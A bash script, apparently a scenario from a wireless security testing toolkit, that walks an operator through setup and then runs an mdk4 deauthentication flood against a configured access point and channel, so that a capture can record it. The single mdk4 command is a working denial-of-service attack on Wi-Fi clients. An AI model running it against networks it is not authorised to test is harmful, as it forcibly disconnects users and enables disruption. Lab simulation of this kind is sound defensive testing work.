#!/bin/bash

# ─── Paths ───
BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_DIR="$BASH_DIR/config"
HELPERS_DIR="$BASH_DIR/helpers"
SCENARIO_DIR="$BASH_DIR/scenarios"
SERVICES_DIR="$BASH_DIR/services"
UTILITIES_DIR="$BASH_DIR/utilities"

# ─── Configs ───
source "$CONFIG_DIR/global.conf"
source "$CONFIG_DIR/t007.conf"

# ─── Dependencies ───
source "$HELPERS_DIR/fn_mode.sh"
source "$HELPERS_DIR/fn_print.sh"
source "$HELPERS_DIR/fn_prompt.sh"

# ─── Show Introduction ───
print_none "This scenario simulates a high-volume deauth flood intended to forcibly disconnect clients from an AP."

confirmation

# ─── Show Pre-reqs ───
print_section "Scenario Pre-requisites"
print_none "1. WPA2-PSK Access Point with associated client"
print_none "2. WSTT full/filtered capture"
print_blank

# ─── Show Parameters ───
print_section "Simulation Parameters"
print_none "Threat    : $SCN_NAME ($SCN_ID)"
print_none "Interface : $INTERFACE"
print_none "Tool      : $SCN_TOOL"
print_none "Mode      : $SCN_MODE"

confirmation

# ─── Show AP Config ───
print_section "Access Point / Client Preparation"
print_none "Profile   : $SCN_PROFILE"

confirmation

# ─── Show Capture Config ───
print_section "WSTT Capture Preparation"
print_action "Launch a full or filtered capture using WSTT"
print_none "BSSID     : $SCN_BSSID"
print_none "Channel   : $SCN_CHANNEL"
print_none "Duration  : $SCN_DURATION seconds"

confirmation

# ─── Run Simulation ───
clear
print_section "Simulation"

ensure_monitor_mode
print_waiting "Running"
sudo timeout "$SCN_DURATION" mdk4 "$INTERFACE" d -B "$SCN_BSSID" -c "$SCN_CHANNEL"
EXIT_CODE=$?
ensure_managed_mode

print_blank

if (( EXIT_CODE == 0 )); then
    print_success "Simulation completed"
else
    print_fail "Simulation stopped (Code: $EXIT_CODE)"
fi

exit 0